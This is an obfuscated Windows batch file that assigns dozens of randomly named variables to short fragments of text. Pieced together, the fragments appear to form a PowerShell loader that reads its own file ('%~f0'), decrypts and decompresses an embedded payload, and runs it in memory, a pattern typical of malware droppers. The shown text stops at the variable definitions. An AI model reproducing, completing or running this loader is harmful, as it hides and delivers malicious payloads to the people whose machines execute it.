@echo off
set "RmSlzItVVa=t) {"
set "RaZknIKoMz=);$M"
set "VaejRPJSsk=Comp"
set "vXFaxjCErF=sion"
set "WOdVuNShul=y.Ci"
set "dwRYOuFDXb=:('g"
set "JHFmOjgSxX=S46e"
set "SAUnkpKBwF=ew-O"
set "TMCheeBxfm=nage"
set "QFnDlieUcU=.Mem"
set "hanNvlvJRT=ss -"
set "DbfZqUFMWf=z.Su"
set "wXBVQgWjZB=rt]:"
set "cmCRBQLdta=comm"
set "IossspTQUx=$MNf"
set "nREzTHecNm=orF'"
set "NwerAYyKwJ=ntI."
set "GUAwqIDfaK=brea"
set "SoZTrBUJXK='[-1"
set "KHiNErmAsL=esFX"
set "XrpREFsAME===')"
set "wNwOIMnTWG=Nfvf"
set "UPmtimtCjO=pDZz"
set "PAjgtwlIac=esMa"
set "RYFBFTrONp=ispo"
set "DLwnBiNaAc=);$L"
set "KrMaCqzbvm=Nfvf"
set "InecbzLyzz=();$"
set "LxhGRKMTra=, (,"
set "DHxZiKNLqv=zL ="
set "dYkTPNalKB=oryS"
set "wHAfFhsiMh= '')"
set "mOPSwKAvNc=;$Su"
set "BACQHvZNfl=16] "
set "elKwFnLjec=;$dz"
set "AHuFhejgll=Syst"
set "EjYDHFAyQZ=('da"
set "TMXxLfOqgA=stem"
set "CAbeMjHCqO= [Sy"
set "qipbdcPnUb=('%~f0'"
set "KVxqWYneey=UGTu"
set "hwaGtgVJWr=gnir"
set "JQrXOsDaGY='[-1"
set "JrLAHHCYJu=Obje"
set "BBNioIvghc=y.Cr"
set "ZACpPWKYfa=, $O"
set "SDYNSegHWW=-Obj"
set "irWXGpbZJw=)) {"
set "MtyQLKVcbj=::De"
set "wzOxEzJiPt=e]::"
set "ukWpBFpqOu=k; }"
set "hWxmLagWJg=$BQs"
set "DEuhVHAHaI=th('"
set "YNPEQxzEAX=ddin"
set "UuonGvNnzC=ment"
set "eDvzHplcwS=File"
set "qOOitqqxPw=TllA"
set "NepGpBeScP=saBm"
set "BiQjGDJhRI=P.En"
set "TvbKlFuenh=OAYy"
set "fdFgJgMjbH=ach "
set "wggHTfeYeC=rtSZ"
set "gpnuEyClHh=form"
set "lMrVDvlqEW=..-1"
set "JZtcpPcMGn=zL.T"
set "GAXELdBnqf=clBd"
set "BrAvRcOVQR=join"
set "sUkLQXHnyp=prnt"
set "FVQVnMqlfA=comp"
set "zcBVqJLHaf=n ''"
set "ERsabYmdjM=se()"
